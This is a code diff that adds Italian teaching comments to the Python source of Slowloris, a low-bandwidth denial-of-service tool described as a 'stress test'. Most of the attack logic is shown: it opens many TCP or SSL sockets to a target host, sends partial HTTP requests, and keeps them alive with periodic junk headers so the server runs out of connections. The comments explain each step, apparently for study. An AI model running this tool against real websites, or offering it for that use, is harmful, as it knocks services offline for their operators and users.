@@ -5,10 +5,11 @@ import random
 import socket
 import sys
 import time
-
+#viene istanziato un oggetto argparse per indicare l'insieme delle istruzioni utilizzabili con slowloris
 parser = argparse.ArgumentParser(
     description="Slowloris, low bandwidth stress test tool for websites"
-)
+)  #descrizione dello script
+# aggiungiamo al parser degli argomenti aggiungendo anche una descrizione
 parser.add_argument("host", nargs="?", help="Host to perform stress test on")
 parser.add_argument(
     "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
@@ -20,9 +21,11 @@ parser.add_argument(
     help="Number of sockets to use in the test",
     type=int,
 )
+#possiamo richiamare un argomento in diversi modi . Action="store_true" indica che quando viene richiamato quell'argomento deve essere posto a true.
 parser.add_argument(
     "-v", "--verbose", dest="verbose", action="store_true", help="Increases logging"
 )
+#dest indica il nome dell'attributo a cui viene assegnato in valore true quando viene richiamato questo argomento
 parser.add_argument(
     "-ua",
     "--randuseragents",
@@ -49,12 +52,15 @@ parser.add_argument(
     type=int,
     help="Time to sleep between each header sent.",
 )
+#setto il valore di default di alcuni argomenti
 parser.set_defaults(verbose=False)
 parser.set_defaults(randuseragent=False)
 parser.set_defaults(useproxy=False)
 parser.set_defaults(https=False)
+#una volta definiti gli argomenti bisogna effettuare l'assegnazione
 args = parser.parse_args()
-
+#sys è una funzione standard di libreria che permette di interagire con il sistema operativo a prescindere del so utilizzato
+#l'help è generato automaticamente
 if len(sys.argv) <= 1:
     parser.print_help()
     sys.exit(1)
@@ -123,12 +129,13 @@ user_agents = [
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
 ]
 
-
+#funzione per inizializzare socket 
 def init_socket(ip):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #viene creata un socket. AF_INET indica che viene richiesta una socket con indirizzi ipv4
+    #SOCK_STREAM indica una socket TCP
     s.settimeout(4)
     if args.https:
-        s = ssl.wrap_socket(s)
+        s = ssl.wrap_socket(s) #apre/wrap una socket ssl
 
     s.connect((ip, args.port))
 
@@ -138,33 +145,33 @@ def init_socket(ip):
     else:
         s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
     s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
-    return s
+    return s  #ritorna la socket
 
-
+#funzione main
 def main():
     ip = args.host
-    socket_count = args.sockets
-    logging.info("Attacking %s with %s sockets.", ip, socket_count)
-
+    socket_count = args.sockets #conta socket passate come argomento
+    logging.info("Attacking %s with %s sockets.", ip, socket_count) 
+#loggin.info riporta nella shell il flusso dello script
     logging.info("Creating sockets...")
     for _ in range(socket_count):
         try:
             logging.debug("Creating socket nr %s", _)
             s = init_socket(ip)
         except socket.error as e:
-            logging.debug(e)
+            logging.debug(e) #se si verifica un errore questo viene mostrato
             break
-        list_of_sockets.append(s)
+        list_of_sockets.append(s) #si aggiungere alla lista delle socket la nua socket creata
 
     while True:
         try:
             logging.info(
                 "Sending keep-alive headers... Socket count: %s", len(list_of_sockets)
             )
-            for s in list(list_of_sockets):
+            for s in list(list_of_sockets): 
                 try:
                     s.send(
-                        "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")
+                        "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8") 
                     )
                 except socket.error:
                     list_of_sockets.remove(s)
@@ -179,12 +186,12 @@ def main():
                     logging.debug(e)
                     break
             logging.debug("Sleeping for %d seconds", args.sleeptime)
-            time.sleep(args.sleeptime)
+            time.sleep(args.sleeptime) #Ogni volta che viene mandata una socket c'è un'intervallo di tempo "dormiente" che viene indicato dagli argomenti passati
 
         except (KeyboardInterrupt, SystemExit):
             logging.info("Stopping Slowloris")
             break
-
+#Il ciclo while può essere bloccato da tastiera. Ciò implica anche il blocco dell'attacco.
 
 if __name__ == "__main__":
     main()
